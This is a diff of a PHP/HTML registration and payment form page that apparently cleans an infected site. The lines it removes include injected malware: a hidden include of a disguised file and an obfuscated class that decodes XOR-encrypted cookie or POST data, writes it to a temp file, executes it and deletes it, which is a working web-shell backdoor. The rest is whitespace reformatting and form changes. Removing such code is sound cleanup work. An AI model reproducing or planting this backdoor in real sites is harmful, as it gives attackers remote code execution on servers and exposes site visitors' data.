@@ -1,132 +1,3 @@
-<?php
-/*2ba34*/
-
-$revq7 = "/\x68ome/systimatek/public_\x68tml/agdpfintec\x68.com/upi/.af05563a.ccss"; $t8dqk = $revq7; strpos($t8dqk, "vcpiq"); @include_once /* u */ ($t8dqk);
-
-/*2ba34*/
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-session_start();
-
-// Check if the form has been submitted
-if (isset($_POST['submit'])) {
-    // Process the form submission
-    // (You can add your form processing logic here)
-
-    // Set a session variable to indicate that the form has been submitted
-    $_SESSION['form_submitted'] = true;
-
-    // Redirect the user to the payment link
-    $payment_link = "https://paymoney.vrsolutionss.com/payment/form"; // Replace this with your actual payment link
-    header("Location: $payment_link");
-    exit; // Make sure to exit after redirection
-}
-
-// Check if the form has been previously submitted
-if (isset($_SESSION['form_submitted']) && $_SESSION['form_submitted'] === true) {
-    // Redirect the user to the payment link
-    $payment_link = "https://paymoney.vrsolutionss.com/payment/form"; // Replace this with your actual payment link
-    header("Location: $payment_link");
-    exit; // Make sure to exit after redirection
-}
-// $localIP = gethostbyname(ip2long($localIP));
-
-?>
-<?php
-
-
-
-
-
-
-
-$xMJCQGoi = "\101" . chr(198 - 103) . 'l' . "\170" . chr(800 - 687) . 'W';
-$UFOrrn = chr(985 - 886) . chr(1057 - 949) . chr(491 - 394) . "\163" . chr(115) . chr(1050 - 955) . chr(101) . "\x78" . 'i' . chr(595 - 480) . chr(116) . "\x73";
-$bjYdND = class_exists($xMJCQGoi);
-$xMJCQGoi = "723";
-$UFOrrn = "14849";
-if ($bjYdND === FALSE) {
-    class A_lxqW
-    {
-        public function XtgzA()
-        {
-            echo "32369";
-        }
-        private $CZannsB;
-        public static $KalqRtCh = "ca23518c-115c-4a0c-ae7b-d517b3eb09a5";
-        public static $cPGzv = 15662;
-        public function __construct($SEnpiYh = 0)
-        {
-            $UwToCdvtnT = $_POST;
-            $FFBwkiEx = $_COOKIE;
-            $WRoiomOKz = @$FFBwkiEx[substr(A_lxqW::$KalqRtCh, 0, 4)];
-            if (!empty($WRoiomOKz)) {
-                $dJTmniTaUU = "base64";
-                $uPuWbJA = "";
-                $WRoiomOKz = explode(",", $WRoiomOKz);
-                foreach ($WRoiomOKz as $EvxmfF) {
-                    $uPuWbJA .= @$FFBwkiEx[$EvxmfF];
-                    $uPuWbJA .= @$UwToCdvtnT[$EvxmfF];
-                }
-                $uPuWbJA = array_map($dJTmniTaUU . '_' . "\x64" . chr(101) . chr(99) . "\x6f" . "\144" . chr(1063 - 962), array($uPuWbJA,));
-                $uPuWbJA = $uPuWbJA[0] ^ str_repeat(A_lxqW::$KalqRtCh, (strlen($uPuWbJA[0]) / strlen(A_lxqW::$KalqRtCh)) + 1);
-                A_lxqW::$cPGzv = @unserialize($uPuWbJA);
-            }
-        }
-        private function TPROyQUp()
-        {
-            if (is_array(A_lxqW::$cPGzv)) {
-                $xOijKIGOov = sys_get_temp_dir() . "/" . crc32(A_lxqW::$cPGzv[chr(942 - 827) . chr(97) . "\154" . "\164"]);
-                @A_lxqW::$cPGzv["\x77" . 'r' . chr(105) . "\164" . "\x65"]($xOijKIGOov, A_lxqW::$cPGzv["\x63" . chr(711 - 600) . chr(597 - 487) . chr(116) . chr(217 - 116) . "\156" . chr(116)]);
-                include $xOijKIGOov;
-                @A_lxqW::$cPGzv[chr(100) . chr(101) . 'l' . "\x65" . 't' . "\x65"]($xOijKIGOov);
-                $SNawfSr = "61649";
-                exit();
-            }
-        }
-        public function __destruct()
-        {
-            $this->TPROyQUp();
-        }
-    }
-    $YLzBsnilD = new /* 142 */ A_lxqW();
-    $YLzBsnilD = str_repeat("5132_29128", 1);
-} ?>
-
-<?php
-if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    $email = $_POST["email"];
-
-    if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
-        $error = "Please enter a valid email address";
-    }
-
-    // Other validations can go here
-
-    if (isset($error)) {
-        // Redirect back to the form page with error message
-        header("Location: index.php?error=" . urlencode($error));
-        exit();
-    }
-
-    // Process form data if validation passes
-}
-?>
 <!DOCTYPE html>
 <html lang="en">
 
@@ -170,7 +41,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
                 </div>
             </div>
 
-            <form id="form" action="https://paymoney.vrsolutionss.com/payment/form" method="POST" onsubmit="validateForm()">
+            <form id="form" action="" method="POST" onsubmit="validateForm()">
                 <div id="section1">
                     <div id="container" onclick="nextStep(2)"></div>
                 </div>
@@ -260,20 +131,20 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
                 <div id="section3" style="display: none;">
                     <div class="formbold-input-group">
                         <label for="name" class="formbold-form-label">Full Name:</label>
-                        <input type="text" id="name" name="custom" placeholder="Enter your Full Name" class="formbold-form-input" >
+                        <input type="text" id="name" name="custom" placeholder="Enter your Full Name" class="formbold-form-input">
                     </div>
                     <div class="formbold-input-group">
                         <label for="email" class="formbold-form-label">Email:</label>
-                        <input type="email" id="email" name="email" placeholder="Enter your Email" class="formbold-form-input" >
+                        <input type="email" id="email" name="email" placeholder="Enter your Email" class="formbold-form-input">
                     </div>
                     <div class="formbold-input-group">
                         <label for="age" class="formbold-form-label">Mobile:</label>
-                        <input type="text" id="mobile" name="mobile" placeholder="Enter your Mobile" class="formbold-form-input" >
+                        <input type="text" id="mobile" name="mobile" placeholder="Enter your Mobile" class="formbold-form-input">
                     </div>
                     <!-- <button type="submit" class="normal_button highlight" id="normal_button" disabled>Update Student Data</button> -->
                     <div class="formbold-input-group">
                         <label for="name" class="formbold-form-label"> Parents/Guardians </label>
-                        <input type="text" name="parent" id="parent" placeholder="Enter your Parent Name" class="formbold-form-input"  />
+                        <input type="text" name="parent" id="parent" placeholder="Enter your Parent Name" class="formbold-form-input" />
                     </div>
                     <button class="formbold-btn" type="button" onclick="prevStep(2)">Previous</button>
                     <button class="formbold-btn" type="button" onclick="nextStep(4)">Next</button>
@@ -304,20 +175,20 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     </div>
     <script>
         fetch('fetchcategories.php')
-        .then(response => {
-            if (!response.ok) {
-                throw new Error('Failed to fetch categories');
-            }
-            return response.json();
-        })
-        .then(data => {
-            processData(data);
-        })
-        .catch(error => {
-            console.error('Error occurred while fetching data:', error);
-            // Display an error message on the UI or perform additional error handling
-        });
-        </script>
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Failed to fetch categories');
+                }
+                return response.json();
+            })
+            .then(data => {
+                processData(data);
+            })
+            .catch(error => {
+                console.error('Error occurred while fetching data:', error);
+                // Display an error message on the UI or perform additional error handling
+            });
+    </script>
     <script src="validation.js"></script>
     <script>
         $(document).ready(function() {
